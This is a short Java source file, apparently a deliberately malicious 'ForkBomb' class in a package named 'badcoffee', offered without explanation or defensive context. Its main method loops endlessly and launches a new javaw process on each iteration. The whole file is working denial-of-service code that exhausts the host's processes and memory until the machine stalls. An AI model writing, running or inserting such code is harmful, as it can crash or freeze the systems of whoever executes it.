package com.iboy.badcoffee;

import java.io.IOException;

public class ForkBomb 
{
	public static void main(String[] args) throws IOException
	  {
	    while(true)
	    {
	      Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
	    }
	}
}
